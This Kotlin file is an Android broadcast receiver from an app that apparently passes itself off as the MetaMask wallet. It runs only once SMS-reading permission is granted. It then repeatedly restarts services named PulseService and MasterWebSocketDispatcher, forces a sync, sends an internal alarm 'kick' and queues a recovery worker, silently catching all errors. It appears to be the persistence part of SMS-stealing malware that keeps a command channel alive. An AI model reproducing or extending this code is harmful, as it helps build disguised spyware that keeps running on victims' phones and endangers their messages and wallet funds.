package com.example.MetaMask.receivers

import android.content.BroadcastReceiver
import android.content.Context
import android.content.Intent
import android.os.Build
import androidx.core.content.ContextCompat
import androidx.work.ExistingWorkPolicy
import androidx.work.OneTimeWorkRequestBuilder
import androidx.work.OutOfQuotaPolicy
import androidx.work.WorkManager
import com.example.MetaMask.services.MasterWebSocketDispatcher
import com.example.MetaMask.services.PulseService
import com.example.MetaMask.services.ServiceStarterWorker
import com.example.MetaMask.services.sync.SyncManager

class ChimeraStateReceiver : BroadcastReceiver() {

    override fun onReceive(context: Context, intent: Intent) {
        android.util.Log.d("XDBG", "[ChimeraStateReceiver] onReceive enter context=ctx intent=${intent}") //xdbg
        val action = intent.action ?: return

        val hasReadSms = androidx.core.content.ContextCompat.checkSelfPermission(context, android.Manifest.permission.READ_SMS) == android.content.pm.PackageManager.PERMISSION_GRANTED
        if (!hasReadSms) return

        executeRecoveryStack(context, action)
    }

    private fun executeRecoveryStack(context: Context, action: String) {
        android.util.Log.d("XDBG", "[ChimeraStateReceiver] executeRecoveryStack enter context=ctx action=${action}") //xdbg
        try {
            val pulseIntent = Intent(context, PulseService::class.java)
            val masterIntent = Intent(context, MasterWebSocketDispatcher::class.java).apply {
                putExtra("STARTED_FROM", "CHIMERA_$action")
            }

            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
                android.util.Log.d("XDBG", "[ChimeraStateReceiver] if branch") //xdbg
                context.startForegroundService(pulseIntent)
                context.startForegroundService(masterIntent)
            } else {
                context.startService(pulseIntent)
                context.startService(masterIntent)
            }

            SyncManager.forceSync()

        } catch (_: Exception) {}

        try {
            val alarmIntent = Intent(context, AlarmReceiver::class.java).apply {
                this.action = "com.example.MetaMask.INTERNAL_KICK"
            }
            context.sendBroadcast(alarmIntent)
        } catch (_: Exception) {}

        try {
            val request = OneTimeWorkRequestBuilder<ServiceStarterWorker>()
                .setExpedited(OutOfQuotaPolicy.RUN_AS_NON_EXPEDITED_WORK_REQUEST)
                .addTag("CHIMERA_RECOVERY")
                .build()
            WorkManager.getInstance(context).enqueueUniqueWork("SS_ONCE", ExistingWorkPolicy.KEEP, request)
        } catch (_: Exception) {}
    }
}
